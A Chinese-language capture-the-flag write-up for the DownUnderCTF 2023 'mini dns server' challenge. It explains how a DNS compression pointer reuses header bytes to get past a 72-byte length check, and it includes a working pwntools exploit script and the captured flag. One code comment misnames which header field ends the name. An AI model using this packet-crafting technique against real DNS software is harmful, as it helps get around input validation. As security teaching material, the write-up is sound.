# DownUnderCTF 2023 mini dns server Writeup

## 题目简述

自定义 DNS 服务只在原始 UDP 请求长度不超过 72 字节、查询类型为 TXT、域名恰好等于 `free.flag.for.flag.loving.flag.capturers.downunderctf.com` 时返回 flag。完整按标签编码该域名会超过长度限制，需要利用 DNS 名称压缩指针复用数据包头中的字节。

## 解题过程

DNS 名称压缩使用最高两位为 `11` 的 16 位值表示偏移。把 QNAME 的最后 `.com` 替换为 `c0 00`，让解析器跳回数据包偏移 0。接着把两字节 transaction ID 和随后两字节 flags 精心设为：

```text
03 63 6f 6d 00
```

从偏移 0 按域名格式解释时，`03` 表示长度 3，接下来的 `63 6f 6d` 是 `com`，偏移 4 的 `00` 终止域名。对 DNS 服务器而言，解析后的名称完整；对原始长度检查而言，后缀只占两字节指针。

```python
from pwn import flat, remote
from dnslib import DNSRecord

packet = flat([
    b"\x03c",                 # transaction ID，同时编码 03 63
    b"o",                     # flags 高字节，同时提供 6f
    b"m",                     # flags 低字节，同时提供 6d
    b"\x00\x01",             # QDCOUNT
    b"\x00\x00",             # ANCOUNT
    b"\x00\x00",             # NSCOUNT
    b"\x00\x00",             # ARCOUNT；首字节也充当域名终止符
    b"\x04free\x04flag\x03for\x04flag\x06loving\x04flag",
    b"\x09capturers\x0cdownunderctf\xc0\x00",
    b"\x00\x10",             # QTYPE = TXT
    b"\x00\x00",             # QCLASS
])

HOST = "target.example"
PORT = 8053
io = remote(HOST, PORT, typ="udp")
io.send(packet)
print(DNSRecord.parse(io.recv()))
```

TXT 响应包含：

```text
DUCTF{1ts.N0t.DNS.There1s.n0W4y.its_DNS.1tw4s.DNS}
```

## 方法总结

漏洞来自对“原始编码长度”和“解析后语义长度”的混用。DNS 压缩指针不仅能引用 QNAME 内部，也能指向数据包中任何可被解析成标签的偏移；攻击者因此把 transaction ID 和 flags 同时当作 `.com` 编码，绕过 72 字节门槛。
